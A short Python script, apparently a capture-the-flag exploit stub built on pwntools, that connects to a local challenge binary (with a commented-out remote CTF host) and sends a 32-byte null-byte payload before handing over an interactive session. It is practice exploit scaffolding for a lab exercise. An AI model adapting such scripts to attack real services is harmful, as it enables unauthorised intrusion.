from pwn import *

host = 'csie.ctf.tw'
port = 10133
#y = remote(host,port)
y = process('./a')

p = ''
p += '\x00'*32

y.sendline(p)

y.interactive()
